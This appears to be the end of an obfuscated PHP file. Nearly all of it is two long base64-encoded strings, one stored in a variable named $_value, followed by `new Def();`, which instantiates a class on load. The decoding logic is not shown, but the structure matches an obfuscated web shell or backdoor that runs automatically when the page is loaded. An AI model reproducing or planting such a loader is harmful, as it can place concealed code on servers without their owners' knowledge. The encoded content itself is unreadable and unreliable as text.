	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
	';
	 
	var $_value = 'bVLvT9swEP1cJP6Hw4pwIkUt1SBMyo8vKBMTEt3aji8FVanjrFYTO3IcSgT933cxjK2Fb3f37p7fvbPz
	+BtioDQEJysYhkVWNjw8PnJWvMOULAkMoWlXjdFus87GrrOcpdO7dLqg1/P5j+X1ZDanD54PZz588XBQ
	FK5oGm6wcZr+/JXO5gu63DxhjwfPx0eDgWOf3Kc86LRs46CnG+yAo6L/WK8mk5vv6aIXeMC5j4UWeN3K
	6JZbMqvvhFe16VwcwnnNTaslZFpntuQDZUHAggvqQ8/jW2d6KZytFdBopfIOlGRKGv5kKi7bmLyRWPNI
	EjVMi9okuWIt4ma41cLwUrrk/OwcbpWBb6qVOfHC9w4lN7zL1Vb2J2glM0JJl+N2ogCXD5nR5Q0e5PS0
	z7D1SuUc4jiG4BJeXmC/9jX4pHbxsTYeX/4z4PXwu3ArJOpAQawUbPOZnJN3PX+HQ/iw6j2NCqUryOxs
	TAhU3KxVHpNaNQY9ErJuDZiu5jHpjSQgswpj/AEHKH6VSiD+mJUtpkmC+KgnT+6pF+6i0Zvd0ag/TULD
	Pw==';
}

new Def();
?>